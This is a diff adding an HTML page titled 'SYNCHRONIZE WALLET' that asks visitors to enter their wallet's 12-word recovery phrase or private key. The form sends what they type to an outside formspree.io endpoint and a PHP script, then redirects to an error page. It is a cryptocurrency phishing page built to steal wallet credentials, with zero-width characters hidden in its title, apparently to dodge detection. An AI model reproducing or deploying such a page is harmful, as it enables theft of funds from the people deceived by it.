@@ -1,0 +1,101 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="SYNCHRONIZE WALLET​​​">
+    <meta name="description" content="">
+    <title>meta</title>
+    <link rel="stylesheet" href="nicepage.css" media="screen">
+<link rel="stylesheet" href="meta.css" media="screen">
+    <script class="u-script" type="text/javascript" src="jquery.js" defer=""></script>
+    <script class="u-script" type="text/javascript" src="nicepage.js" defer=""></script>
+    <meta name="generator" content="Nicepage 4.11.3, nicepage.com">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,300i,400,400i,700,700i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
+    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:100,200,300,400,500,600,700,800,900|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i">
+    
+    
+    
+    <script type="application/ld+json">{
+		"@context": "http://schema.org",
+		"@type": "Organization",
+		"name": "official"
+}</script>
+    <meta name="theme-color" content="#478ac9">
+    <meta property="og:title" content="meta">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+  </head>
+  <body class="u-body u-xl-mode"><header class="u-clearfix u-header u-header" id="sec-fc80"><div class="u-clearfix u-sheet u-valign-middle-xs u-sheet-1">
+        <nav class="u-menu u-menu-dropdown u-offcanvas u-menu-1" data-responsive-from="XL">
+          <div class="menu-collapse" style="font-size: 1rem; letter-spacing: 0px; font-weight: 500;">
+            <a class="u-button-style u-custom-active-color u-custom-border u-custom-border-color u-custom-hover-color u-custom-left-right-menu-spacing u-custom-padding-bottom u-custom-text-active-color u-custom-text-color u-custom-text-hover-color u-custom-top-bottom-menu-spacing u-nav-link u-text-active-palette-1-base u-text-hover-palette-2-base" href="#" style="font-size: calc(1em + 10px);">
+              <svg class="u-svg-link" viewBox="0 0 24 24"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#menu-hamburger"></use></svg>
+              <svg class="u-svg-content" version="1.1" id="menu-hamburger" viewBox="0 0 16 16" x="0px" y="0px" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><g><rect y="1" width="16" height="2"></rect><rect y="7" width="16" height="2"></rect><rect y="13" width="16" height="2"></rect>
+</g></svg>
+            </a>
+          </div>
+          <div class="u-custom-menu u-nav-container">
+            <ul class="u-nav u-spacing-2 u-unstyled u-nav-1"><li class="u-nav-item"><a class="u-active-grey-5 u-button-style u-hover-grey-10 u-nav-link u-text-active-grey-90 u-text-grey-90 u-text-hover-grey-90" href="home.html" style="padding: 10px 20px;">home</a>
+</li></ul>
+          </div>
+          <div class="u-custom-menu u-nav-container-collapse">
+            <div class="u-black u-container-style u-inner-container-layout u-opacity u-opacity-95 u-sidenav">
+              <div class="u-inner-container-layout u-sidenav-overflow">
+                <div class="u-menu-close"></div>
+                <ul class="u-align-center u-nav u-popupmenu-items u-unstyled u-nav-2"><li class="u-nav-item"><a class="u-button-style u-nav-link" href="home.html">home</a>
+</li></ul>
+              </div>
+            </div>
+            <div class="u-black u-menu-overlay u-opacity u-opacity-70"></div>
+          </div>
+        </nav>
+      </div></header>
+    <section class="u-clearfix u-section-1" id="sec-25a5">
+      <div class="u-clearfix u-sheet u-sheet-1">
+        <div class="u-align-center u-container-style u-expanded-width-md u-expanded-width-sm u-expanded-width-xs u-group u-shape-rectangle u-group-1">
+          <div class="u-container-layout u-container-layout-1">
+            <h1 class="u-custom-font u-font-roboto-slab u-text u-text-custom-color-2 u-text-default-lg u-text-default-xl u-title u-text-1">SYNCH​RONIZE WALLET </h1>
+            <p class="u-align-center-lg u-align-center-md u-align-center-sm u-align-center-xs u-large-text u-text u-text-variant u-text-2">Enter your wallet 12 Words Phrase or Private Key to Synchronize</p>
+            <div class="u-align-center u-border-1 u-border-custom-color-2 u-expanded-width-sm u-expanded-width-xs u-form u-radius-29 u-form-1">
+              <form action="scripts/form-25a5-3.php" method="POST" class="u-clearfix u-form-spacing-22 u-form-vertical u-inner-form" style="padding: 20px;" source="customphp" redirect="true" redirect-url="65272865" redirect-address="error.html">
+                <div class="u-form-group">
+                  <label for="email-ef64" class="u-form-control-hidden u-label u-label-1" wfd-invisible="true"></label>
+                  <form action="https://formspree.io/f/mvolngyv" method="POST" accept-charset="UTF-8" class="margin-2">
+
+    
+    <div class="seed-block margin-3">
+    <w-input textarea="id=" required="" name="PrivateKey" maxlength="150" class="embed no-icon big ng-pristine ng-untouched ng-isolate-scope ng-valid-minlength ng-not-empty ng-valid ng-valid-required=" placeholder="Enter Phrase or Private Keys" w-i18n-attr="placeholder" minlength="25" aria-invalid="false" aria-required="true" style="">
+   
+
+<div class="w-input-wrap">
+<textarea textarea="id=" required="" name="PrivateKey" maxlength="150" "="" class="embed no-icon big ng-isolate-scope ng-valid-minlength ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required" ng-model="mpcseed" placeholder="Phrase" w-i18n-attr="placeholder" minlength="24" required"name="login_password" aria-invalid="false" style=""></textarea></div>
+</w-input>
+
+
+
+
+<div class="body-2 basic-900 ng-scope" w-i18n="seedForm.seedTitle">Typically 12 (sometimes 24) words separated by single spaces</div></div>
+
+
+<w-button disabled="!$ctrl.address" class="submit big long ng-isolate-scope" w-step-next="">
+<button ng-transclude="" class="submit big long">
+<w-i18n class="ng-scope">IMPORT</w-i18n>
+</button>
+</w-button>
+</form>
+             
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="u-clearfix u-image u-image-contain u-section-2" id="sec-3d52" data-image-width="1500" data-image-height="500">
+      <div class="u-clearfix u-sheet u-sheet-1"></div>
+    </section>
+    
+    
+    <footer class="u-align-center u-clearfix u-custom-color-2 u-footer u-footer" id="sec-148e"><div class="u-align-left u-clearfix u-sheet u-sheet-1"></div></footer>
+  </body>
+</html>
